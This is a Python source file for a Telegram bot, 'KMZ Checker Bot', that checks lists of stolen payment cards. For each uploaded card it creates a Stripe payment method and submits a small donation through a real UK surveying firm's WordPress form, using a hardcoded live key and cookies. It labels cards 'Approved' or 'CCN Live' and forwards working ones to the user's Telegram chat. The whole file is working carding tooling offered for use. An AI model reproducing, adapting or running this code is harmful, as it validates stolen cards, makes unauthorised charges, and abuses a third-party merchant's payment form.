import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext, filters
import requests
import time
import pyfiglet
from quart import Quart, request, jsonify

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Color codes
Z = '\033[1;31m'  # Red
F = '\033[2;32m'  # Green
C = '\033[2;35m'  # Purple

# Display logo
logo = pyfiglet.figlet_format('KMZ BOT')
print(Z + logo)

# Initialize Quart app
app = Quart(__name__)

# Telegram Bot Token from environment
TOKEN = os.getenv('BOT_TOKEN')
if not TOKEN:
    raise ValueError("No BOT_TOKEN environment variable set!")

# ========== HANDLER FUNCTIONS (DEFINE THESE FIRST) ==========

async def start(update: Update, context: CallbackContext) -> None:
    """Send welcome message"""
    user = update.effective_user
    await update.message.reply_text(
        f'Hi {user.first_name}! Welcome to KMZ Checker Bot\n\n'
        'Send me a combo file (text file with CC details) to start checking.'
    )

async def help_command(update: Update, context: CallbackContext) -> None:
    """Send help message"""
    await update.message.reply_text(
        'Help: Send me a combo file (text file) with CC details in format:\n'
        'cardnumber|mm|yy|cvc'
    )

async def handle_document(update: Update, context: CallbackContext) -> None:
    """Handle received combo file"""
    try:
        file = await update.message.document.get_file()
        await file.download_to_drive('combo.txt')
        
        if 'token' not in context.user_data:
            await update.message.reply_text('Please send your Telegram bot token:')
            return
        if 'chat_id' not in context.user_data:
            await update.message.reply_text('Please send your Telegram chat ID:')
            return
        
        await process_combo(update, context, 'combo.txt')
    except Exception as e:
        logger.error(f"Error handling document: {e}")
        await update.message.reply_text("Error processing your file. Please try again.")

# ========== OTHER FUNCTIONS ==========

async def process_combo(update: Update, context: CallbackContext, combo_file: str):
    """Process the combo file"""
    await update.message.reply_text('Starting to check cards...')
    
    token = context.user_data['token']
    chat_id = context.user_data['chat_id']
    start_num = 0
    
    with open(combo_file, 'r') as file:
        for P in file.readlines():
            start_num += 1
            try:
                n, mm, yy, cvc = P.split('|')[:4]
                yy = yy[-2:]
                cvc = cvc.strip()

                time.sleep(10)
                
                headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                }

                data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_9sEidmFcTHYDfhGn3zZYH1wG00ZmolhPCV'

                r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
                
                try:
                    pm = r1.json()['id']
                    await update.message.reply_text(r1.text)
                except:
                    er = r1.json()['error']['message']
                    if 'Your card number is incorrect.' in r1.text:
                        await update.message.reply_text(f'[ {start_num} ] {P} ➠➠ Incorrect Number ❌')
                        continue
                    else:
                        await update.message.reply_text(er)
                        continue
                
                time.sleep(10)

                cookies = {
                    '__stripe_mid': '230ce009-a549-426f-85bc-03755d77fc9c4c1b8c',
                    '__stripe_sid': '7ce5943d-649f-4c39-9295-6087751937fcc63f98',
                }

                headers = {
                    'authority': 'fpsurveying.co.uk',
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://fpsurveying.co.uk',
                    'referer': 'https://fpsurveying.co.uk/book/homebuyer-instruction-august-old/',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

                params = {'t': '1744046259435'}

                data = {
                    'data': f'payment_method=stripe&custom_donation_amount=3.00&__stripe_payment_method_id={pm}',
                    'action': 'fluentform_submit',
                    'form_id': '44'
                }

                r2 = requests.post(
                    'https://fpsurveying.co.uk/wp-admin/admin-ajax.php',
                    params=params,
                    cookies=cookies,
                    headers=headers,
                    data=data,
                )
                
                if "Thank you so much for your donation" in r2.text:
                    msg = f'''✘ Succeeded ✅
✘ Approved ✅
✘ CC ➠ {P}
✘ Result ➠ Approved
✘ Gateway ➠ Stripe Auth
━━━━━━━━━━━━━━━━━  
✘ By ➠ KMZ BOT'''
                    await update.message.reply_text(msg)
                    await send_telegram_alert(token, chat_id, msg)
                
                elif "insufficient funds" in r2.text:
                    msg = f'''✘ Approved ✅
✘ CC ➠ {P}
✘ Result ➠ Approved ✅ (Low balance)
━━━━━━━━━━━━━━━━━  
✘ By ➠ KMZ BOT'''
                    await update.message.reply_text(msg)
                    await send_telegram_alert(token, chat_id, msg)

                elif "security code is incorrect" in r2.text or "ZIP INCORRECT" in r2.text:
                    msg = f'''✘ Approved ✅
✘ CC ➠ {P}
✘ Result ➠ Approved ✅ (CCN Live)
━━━━━━━━━━━━━━━━━  
✘ By ➠ KMZ BOT'''
                    await update.message.reply_text(msg)
                    await send_telegram_alert(token, chat_id, msg)

                else:
                    await update.message.reply_text(f'[ {start_num} ] {P} ➠➠ Declined ❌')

            except Exception as e:
                await update.message.reply_text(f'Error processing line {start_num}: {str(e)}')
                continue


async def send_telegram_alert(token: str, chat_id: str, message: str):
    """Send alert to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(url, data=payload)
        response.raise_for_status()
    except Exception as e:
        logger.error(f"Error sending Telegram alert: {e}")

async def handle_text(update: Update, context: CallbackContext) -> None:
    """Handle text messages"""
    text = update.message.text.strip()
    
    if 'token' not in context.user_data:
        context.user_data['token'] = text
        await update.message.reply_text('Token saved. Now please send your chat ID:')
        return
    
    if 'chat_id' not in context.user_data:
        context.user_data['chat_id'] = text
        await update.message.reply_text('Chat ID saved. Now please send your combo file (as document):')

# ========== APPLICATION SETUP ==========

# Initialize Telegram application
# Telegram bot application - OLD VERSION (problematic)
application = Application.builder().token(TOKEN).build()

# Change to this NEW VERSION:
def setup_application():
    """Initialize and configure the Telegram application"""
    application = Application.builder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    return application

# Initialize the application properly
application = setup_application()

# Webhook setup
def set_webhook():
    """Set up the webhook URL"""
    try:
        webhook_url = f"https://telebot-ep9a.onrender.com/{TOKEN}"
        response = requests.get(
            f'https://api.telegram.org/bot{TOKEN}/setWebhook',
            params={'url': webhook_url}
        )
        if response.status_code == 200:
            logger.info("Webhook set successfully!")
        else:
            logger.error(f"Failed to set webhook: {response.text}")
    except Exception as e:
        logger.error(f"Error setting webhook: {e}")

@app.route(f'/{TOKEN}', methods=['POST'])
async def webhook():
    """Handle incoming updates from Telegram"""
    try:
        json_data = await request.get_json()
        update = Update.de_json(json_data, application.bot)
        
        # Initialize update processing
        async with application:
            await application.initialize()
            await application.process_update(update)
            
        return '', 200
    except Exception as e:
        logger.error(f"Error in webhook: {e}")
        return jsonify({"status": "error"}), 500
        
@app.route('/')
async def index():
    """Basic health check endpoint"""
    return 'KMZ Bot is running!'

async def run_app():
    """Run both Quart app and Telegram bot"""
    set_webhook()
    await app.run_task(host='0.0.0.0', port=8000)

if __name__ == '__main__':
    import asyncio
    asyncio.run(run_app())
